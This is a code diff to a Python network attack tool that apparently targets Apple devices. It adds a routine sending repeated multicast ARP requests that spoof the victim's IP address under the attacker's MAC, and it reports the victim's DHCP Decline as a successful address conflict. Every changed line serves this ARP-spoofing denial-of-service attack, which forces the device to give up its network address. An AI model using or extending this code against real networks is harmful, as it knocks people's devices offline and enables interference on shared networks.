@@ -130,13 +130,27 @@ if args.target_ip is not None:
 
 
 # region ARP reply sender
+def send_arp_request():
+    arp_init_request = arp.make_request(ethernet_src_mac=your_mac_address,
+                                        ethernet_dst_mac="33:33:00:00:00:01",
+                                        sender_mac=your_mac_address,
+                                        sender_ip=apple_device[0],
+                                        target_mac="00:00:00:00:00:00",
+                                        target_ip=Base.get_netiface_random_ip(listen_network_interface))
+    for _ in range(5):
+        socket_global.send(arp_init_request)
+        sleep(0.5)
+# endregion
+
+
+# region ARP reply sender
 def send_arp_reply():
     arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                   ethernet_dst_mac=apple_device[1],
                                   sender_mac=your_mac_address, sender_ip=apple_device[0],
                                   target_mac=apple_device[1], target_ip=apple_device[0])
     socket_global.send(arp_reply)
-    Base.print_info("ARP response to:  ", apple_device[1], " \"",
+    Base.print_info("ARP response to: ", apple_device[1], " \"",
                     apple_device[0] + " is at " + your_mac_address, "\"")
 # endregion
 
@@ -162,10 +176,13 @@ def reply(request):
 
     # region DHCP request
     if 'DHCP' in request.keys():
+        if request['DHCP'][53] == 4:
+            Base.print_success("DHCP Decline from: ", request['Ethernet']['source'],
+                               " IPv4 address conflict detection!")
         if request['DHCP'][53] == 3:
             if 50 in request['DHCP'].keys():
                 apple_device[0] = str(request['DHCP'][50])
-                Base.print_success("DHCP REQUEST from: ", apple_device[1], " requested ip: ", apple_device[0])
+                Base.print_success("DHCP Request from: ", apple_device[1], " requested ip: ", apple_device[0])
     # endregion
 
 # endregion
@@ -328,10 +345,10 @@ if __name__ == "__main__":
         tm.add_task(sniffer)
         # endregion
 
-        # region Send first ARP reply
-        sleep(5)
-        Base.print_warning("Send first (init) ARP reply ...")
-        send_arp_reply()
+        # region Send first Multicast ARP request
+        sleep(3)
+        Base.print_warning("Send initial Multicast ARP requests")
+        send_arp_request()
         # endregion
 
         # region Wait for completion
